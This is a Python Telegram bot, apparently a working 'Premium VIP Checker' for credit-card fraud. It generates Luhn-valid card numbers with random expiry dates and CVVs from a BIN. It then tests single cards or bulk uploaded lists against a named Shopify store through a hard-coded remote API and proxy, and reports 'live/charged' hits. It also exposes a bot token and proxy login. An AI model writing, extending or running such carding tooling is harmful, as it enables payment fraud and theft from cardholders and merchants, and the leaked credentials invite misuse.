import telebot
import requests
import threading
import os
import time
import random
import concurrent.futures

# ==========================================
# ⚙️ CONFIGURATION (Apna Token Yahan Daalo)
# ==========================================
BOT_TOKEN = "6311239620:AAEY0bStLn28zbwaLctjUKa1XWmyYNT_iOE"
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

API_URL = "http://5.175.140.23:5000/shopify"
DEFAULT_SITE = "https://shinybynature.com"
DEFAULT_PROXY = "px1260303.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj"

# ==========================================
# 🛠️ HELPER CLASSES & FUNCTIONS
# ==========================================
class CheckerStats:
    def __init__(self, total_cards):
        self.total = total_cards
        self.checked = 0
        self.live = 0
        self.dead = 0
        self.is_completed = False
        self.lock = threading.Lock()

def luhn_check(card_number):
    """Mathematically valid cards check karne ke liye Luhn Algorithm"""
    total = 0
    num_digits = len(card_number)
    oddeven = num_digits & 1

    for count in range(0, num_digits):
        digit = int(card_number[count])
        if not ((count & 1) ^ oddeven):
            digit = digit * 2
        if digit > 9:
            digit = digit - 9
        total = total + digit
    return (total % 10) == 0

# ==========================================
# 🟢 1. START COMMAND
# ==========================================
@bot.message_handler(commands=['start'])
def start_command(message):
    welcome_text = (
        "<b>⚡ Premium VIP Checker Bot ⚡</b>\n\n"
        "<b>Commands:</b>\n"
        "🔸 <code>/chk cc|mm|yy|cvv site proxy</code> (Single Check)\n"
        "🔸 <code>/gen 552213 1000</code> (Generate Min 1k Cards)\n"
        "🔸 <b>Upload .txt file with caption</b> <code>/chktx</code> (Mass Check with 10 Threads)"
    )
    bot.reply_to(message, welcome_text)

# ==========================================
# 🟢 2. SINGLE CHECK COMMAND (/chk)
# ==========================================
@bot.message_handler(commands=['chk'])
def chk_command(message):
    try:
        args = message.text.split()[1:]
        if len(args) < 3:
            bot.reply_to(message, "<b>❌ Invalid Format!</b>\nUse: <code>/chk cc|mm|yy|cvv site proxy</code>")
            return

        cc = args[0]
        site = args[1]
        proxy = args[2]

        msg = bot.reply_to(message, "<b>⏳ Processing your request...</b>")

        params = {'site': site, 'cc': cc, 'proxy': proxy}
        response = requests.get(API_URL, params=params, timeout=15)
        
        if response.status_code == 200:
            final_text = (
                "<b>✅ Check Completed</b>\n\n"
                f"<b>💳 CC:</b> <code>{cc}</code>\n"
                f"<b>🌐 Site:</b> {site}\n"
                f"<b>📝 Result:</b> <code>{response.text}</code>"
            )
            bot.edit_message_text(final_text, chat_id=message.chat.id, message_id=msg.message_id)
        else:
            bot.edit_message_text("<b>❌ API Error or Bad Request</b>", chat_id=message.chat.id, message_id=msg.message_id)

    except requests.exceptions.RequestException:
        bot.edit_message_text("<b>❌ Error: API connection timeout.</b>", chat_id=message.chat.id, message_id=msg.message_id)
    except Exception:
        bot.edit_message_text("<b>❌ System Error!</b>", chat_id=message.chat.id, message_id=msg.message_id)

# ==========================================
# 🟢 3. CC GENERATOR COMMAND (/gen)
# ==========================================
@bot.message_handler(commands=['gen'])
def generate_cards(message):
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "<b>❌ Invalid Format!</b>\nUse: <code>/gen 552213 1000</code>")
            return
        
        bin_number = args[1]
        if len(bin_number) < 6:
            bot.reply_to(message, "<b>❌ Invalid BIN! Minimum 6 digits required.</b>")
            return

        try:
            amount = int(args[2]) if len(args) > 2 else 1000
        except ValueError:
            amount = 1000
            
        # Ensure minimum 1000 cards
        if amount < 1000:
            amount = 1000
            
        msg = bot.reply_to(message, f"<b>⏳ Generating {amount} cards for BIN <code>{bin_number}</code>...</b>")
        
        generated_cards = []
        for _ in range(amount):
            cc = bin_number
            while len(cc) < 15:
                cc += str(random.randint(0, 9))
            
            for i in range(10):
                test_cc = cc + str(i)
                if luhn_check(test_cc):
                    cc = test_cc
                    break
                    
            month = str(random.randint(1, 12)).zfill(2)
            year = str(random.randint(2026, 2032))
            cvv = str(random.randint(100, 999))
            
            generated_cards.append(f"{cc}|{month}|{year}|{cvv}")
            
        file_name = f"Gen_{bin_number}_{message.chat.id}.txt"
        with open(file_name, 'w') as f:
            f.write("\n".join(generated_cards))
            
        with open(file_name, 'rb') as f:
            caption = (
                "<b>✅ Generation Complete</b>\n\n"
                f"<b>💳 BIN:</b> <code>{bin_number}</code>\n"
                f"<b>🔢 Amount:</b> {amount}\n"
            )
            bot.send_document(message.chat.id, f, caption=caption)
            
        bot.delete_message(message.chat.id, msg.message_id)
        os.remove(file_name)
        
    except Exception:
        bot.reply_to(message, "<b>❌ System Error: Could not generate cards.</b>")

# ==========================================
# 🟢 4. MASS CHECKER & THREADING (/chktx)
# ==========================================
def check_single_card(cc, chat_id, stats):
    params = {'site': DEFAULT_SITE, 'cc': cc, 'proxy': DEFAULT_PROXY}
    try:
        response = requests.get(API_URL, params=params, timeout=15)
        result = response.text.lower()
        
        with stats.lock:
            stats.checked += 1
            is_live = "live" in result or "charged" in result or "success" in result
            if is_live:
                stats.live += 1
            else:
                stats.dead += 1
                
        if is_live:
            hit_msg = (
                "<b>✅ LIVE / CHARGED FOUND</b>\n\n"
                f"<b>💳 CC:</b> <code>{cc}</code>\n"
                f"<b>📝 Result:</b> <code>{response.text}</code>"
            )
            bot.send_message(chat_id, hit_msg)

    except requests.exceptions.RequestException:
        with stats.lock:
            stats.checked += 1
            stats.dead += 1

def update_dashboard_loop(chat_id, msg_id, stats):
    while not stats.is_completed:
        dashboard_text = (
            "<b>🚀 ULTRA FAST DASHBOARD [10 THREADS]</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"<b>📁 Total Cards:</b> {stats.total}\n"
            f"<b>🔄 Checked:</b> {stats.checked} / {stats.total}\n"
            f"<b>✅ Live/Charged:</b> {stats.live}\n"
            f"<b>❌ Dead/Failed:</b> {stats.dead}\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "<b>Status:</b> Checking... ⚡"
        )
        try:
            bot.edit_message_text(dashboard_text, chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass 
        time.sleep(2) 

    final_text = (
        "<b>🏁 MASS CHECK COMPLETED!</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"<b>📁 Total Cards:</b> {stats.total}\n"
        f"<b>🔄 Checked:</b> {stats.checked}\n"
        f"<b>✅ Live/Charged:</b> {stats.live}\n"
        f"<b>❌ Dead/Failed:</b> {stats.dead}\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "<b>Status:</b> Completed ✅"
    )
    try:
        bot.edit_message_text(final_text, chat_id=chat_id, message_id=msg_id)
    except Exception:
        pass

def process_txt_file(chat_id, file_path, dashboard_msg_id):
    try:
        with open(file_path, 'r') as file:
            cards = [line.strip() for line in file if line.strip()]
        
        stats = CheckerStats(len(cards))
        
        updater_thread = threading.Thread(target=update_dashboard_loop, args=(chat_id, dashboard_msg_id, stats))
        updater_thread.start()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            for cc in cards:
                executor.submit(check_single_card, cc, chat_id, stats)
                
        stats.is_completed = True
        updater_thread.join() 
        
    except Exception as e:
        bot.send_message(chat_id, f"<b>❌ Error processing file.</b>")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

@bot.message_handler(content_types=['document'])
def handle_chktx(message):
    caption = message.caption if message.caption else ""
    
    if caption.startswith('/chktx'):
        try:
            if not message.document.file_name.endswith('.txt'):
                bot.reply_to(message, "<b>❌ Upload a valid .txt file.</b>")
                return
            
            dashboard_msg = bot.reply_to(message, "<b>⚡ Initializing 10-Thread Engine...</b>")
            
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            file_path = f"cards_{message.chat.id}_{message.message_id}.txt"
            with open(file_path, 'wb') as new_file:
                new_file.write(downloaded_file)
                
            main_thread = threading.Thread(target=process_txt_file, args=(message.chat.id, file_path, dashboard_msg.message_id))
            main_thread.start()
            
        except Exception:
            bot.reply_to(message, "<b>❌ System Error: Failed to load document.</b>")

# ==========================================
# 🚀 BOT START
# ==========================================
print("✅ Premium VIP Bot is running successfully...")
bot.infinity_polling()
